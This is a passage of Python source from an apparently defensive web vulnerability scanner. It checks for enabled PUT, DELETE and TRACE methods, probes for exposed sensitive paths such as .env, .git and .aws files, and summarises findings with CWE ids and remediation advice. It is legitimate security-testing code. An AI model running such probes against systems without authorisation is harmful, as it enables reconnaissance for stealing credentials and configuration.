                    cvss_score=7.5 if acac else 5.3,
                ))
        except Exception:
            pass

    async def _check_http_methods(self, url: str) -> None:
        """Check for dangerous HTTP methods."""
        if not self.config.test_methods:
            return
        dangerous_methods = ["PUT", "DELETE", "TRACE", "CONNECT", "PATCH"]
        try:
            client = await self._get_client()
            # Try OPTIONS first
            resp = await client.options(url)
            allow = resp.headers.get("allow", "")

            for method in dangerous_methods:
                if method in allow.upper():
                    self._findings.append(WebFinding(
                        vuln_type=VulnType.HTTP_METHOD_TAMPERING,
                        severity=Severity.MEDIUM if method != "TRACE" else Severity.LOW,
                        url=url,
                        evidence=f"Allow: {allow}",
                        description=f"HTTP {method} method is enabled",
                        remediation=f"Disable HTTP {method} method if not needed.",
                        confidence=0.8,
                        cwe_id="CWE-16",
                    ))
        except Exception:
            pass

    async def _check_sensitive_files(self, base_url: str) -> None:
        """Check for exposed sensitive files and directories."""
        client = await self._get_client()
        sem = asyncio.Semaphore(10)

        async def check_path(path: str) -> None:
            async with sem:
                try:
                    url = f"{base_url}{path}"
                    resp = await client.get(url, follow_redirects=False)
                    if resp.status_code == 200 and len(resp.text) > 0:
                        # Verify it's not a custom 404
                        if resp.status_code == 200 and "not found" not in resp.text.lower()[:200]:
                            severity = Severity.HIGH if any(
                                s in path for s in [".env", ".git", "config", "backup", "admin", ".aws", "phpinfo"]
                            ) else Severity.MEDIUM
                            self._findings.append(WebFinding(
                                vuln_type=VulnType.INFORMATION_DISCLOSURE,
                                severity=severity,
                                url=url,
                                evidence=f"HTTP {resp.status_code}, Size: {len(resp.text)} bytes",
                                description=f"Sensitive file/path accessible: {path}",
                                remediation="Restrict access to sensitive files. Add authentication or remove from webroot.",
                                confidence=0.7,
                                cwe_id="CWE-538",
                            ))
                except Exception:
                    pass

        await asyncio.gather(*[check_path(p) for p in SENSITIVE_PATHS])

    def get_findings(self) -> list[WebFinding]:
        return self._findings

    def get_summary(self) -> dict[str, Any]:
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        type_counts: dict[str, int] = {}
        for f in self._findings:
            severity_counts[f.severity.value] = severity_counts.get(f.severity.value, 0) + 1
            type_counts[f.vuln_type.value] = type_counts.get(f.vuln_type.value, 0) + 1

        return {
            "target": self._base_url,
            "pages_crawled": len(self._crawled),
            "total_findings": len(self._findings),
            "severity_counts": severity_counts,
            "type_counts": type_counts,
        }

    async def close(self) -> None:
        if self._client and not self._client.is_closed:
            await self._client.aclose()
